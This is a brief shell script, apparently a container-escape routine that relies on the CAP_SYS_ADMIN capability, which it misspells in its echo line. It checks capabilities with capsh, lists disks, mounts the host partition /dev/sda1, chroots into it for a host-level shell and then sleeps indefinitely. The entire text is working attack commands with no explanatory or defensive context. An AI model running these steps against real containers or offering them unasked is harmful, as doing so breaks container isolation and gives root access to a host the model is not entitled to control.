
echo [+] CAP_SYS_ADMIM

capsh --print

fdisk -l

mount /dev/sda1 /mnt/

cd /mnt
chroot ./ bash

sleep 10000000
